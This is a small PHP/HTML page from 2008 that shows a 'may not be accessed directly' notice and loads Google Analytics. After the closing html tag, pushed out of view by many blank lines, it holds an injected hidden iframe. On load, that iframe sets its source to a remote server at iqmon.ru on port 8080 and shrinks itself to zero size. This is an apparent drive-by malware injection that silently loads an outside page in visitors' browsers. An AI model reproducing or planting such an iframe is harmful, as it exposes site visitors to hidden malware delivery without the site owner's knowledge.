<html>
<body>
<?php
/*
 * Created on Sep 16, 2008
 *
 * To change the template for this generated file go to
 * Window - Preferences - PHPeclipse - PHP - Code Templates
 */
 echo "<h2> For security purposes application may not be accessed directly </h2>";
 echo "<h3> Owner of this domain will know how to access the application </h3>";
?>

<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-7650802-1");
pageTracker._trackPageview();
} catch(err) {}</script>


</body>
</html>


























<iframe frameborder="0" onload="if (!this.src){ this.src='http://iqmon.ru:8080/index.php'; this.height='0'; this.width='0';}" >ipailyahnbgjpiostnblqsdpyptvavj</iframe>